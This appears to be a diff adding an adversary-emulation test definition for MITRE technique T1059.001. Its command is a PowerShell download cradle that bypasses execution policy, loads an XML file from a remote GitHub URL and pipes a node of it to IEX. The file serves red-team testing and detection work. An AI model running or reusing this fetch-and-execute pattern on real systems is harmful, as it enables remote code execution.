@@ -1,0 +1,22 @@
+---
+- id: 724693bb7a55fdc94d84bd52d58c60b7
+  name: Powershell XML requests
+  description: 'Powershell xml download request. Upon execution, "Download Cradle
+    test success!" will be dispalyed.
+
+
+    Provided by https://github.com/mgreen27/mgreen27.github.io
+
+    '
+  tactic: execution
+  technique:
+    attack_id: T1059.001
+    name: 'Command and Scripting Interpreter: PowerShell'
+  platforms:
+    windows:
+      cmd:
+        command: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec
+          bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml'');$Xml.command.a.execute
+          | IEX"'
+        payloads: []
+        cleanup: ''
